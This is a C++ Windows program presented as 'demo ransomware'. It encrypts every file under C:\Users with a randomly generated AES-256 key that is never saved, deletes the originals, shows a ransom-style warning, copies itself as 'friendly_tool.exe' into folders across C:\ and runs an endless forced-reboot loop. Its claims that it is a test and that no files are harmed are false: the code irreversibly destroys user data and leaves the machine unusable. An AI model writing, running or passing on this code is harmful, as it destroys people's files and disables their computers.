#include <windows.h>
#include <wincrypt.h>
#include <vector>
#include <fstream>
#include <filesystem>
#include <thread>
#include <chrono>
#include <string>
#include <iostream>

#pragma comment(lib, "advapi32.lib")

HCRYPTPROV hProv = NULL;
HCRYPTKEY hKey = NULL;

bool setupEncryption() {
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey)) return false;
    return true;
}

bool encryptFileAES(const std::string& filePath) {
    std::ifstream in(filePath, std::ios::binary);
    if (!in) return false;

    std::vector<BYTE> buffer((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();

    DWORD bufSize = static_cast<DWORD>(buffer.size());
    DWORD dwBufLen = bufSize + 1024;
    buffer.resize(dwBufLen);

    if (!CryptEncrypt(hKey, 0, TRUE, 0, buffer.data(), &bufSize, dwBufLen)) return false;

    std::ofstream out(filePath + ".enc", std::ios::binary);
    if (!out) return false;
    out.write(reinterpret_cast<char*>(buffer.data()), bufSize);
    out.close();

    std::filesystem::remove(filePath);
    return true;
}

void encryptDirectoryAES(const std::string& path) {
    for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
        if (entry.is_regular_file()) {
            encryptFileAES(entry.path().string());
        }
    }
}

void simulateWormSpread(const std::string& exePath) {
    for (const auto& drive : std::filesystem::directory_iterator("C:\\")) {
        if (drive.is_directory()) {
            std::string drivePath = drive.path().string();
            if (drivePath != "C:\\") {
                try {
                    std::filesystem::copy_file(exePath, drivePath + "\\friendly_tool.exe", std::filesystem::copy_options::overwrite_existing);

                    std::ofstream info(drivePath + "\\READ_ME.txt");
                    info << "This is a demo of a worm copy simulation.\nNo actual files were harmed.";
                    info.close();
                } catch (...) {
                    // Silent catch
                }
            }
        }
    }
}

void showWarning() {
    MessageBoxA(NULL, "Your files have been encrypted with AES-256.\nThis is a test.", "Demo Ransomware", MB_ICONERROR | MB_OK);
}

void rebootLoop() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(30));
        system("shutdown /r /t 0");
    }
}

int main() {
    std::thread rebooter(rebootLoop);

    if (!setupEncryption()) {
        MessageBoxA(NULL, "Encryption setup failed.", "Error", MB_ICONERROR);
        return 1;
    }

    encryptDirectoryAES("C:\\Users");
    showWarning();

    char modulePath[MAX_PATH];
    GetModuleFileNameA(NULL, modulePath, MAX_PATH);
    simulateWormSpread(modulePath);

    rebooter.join();

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return 0;
}
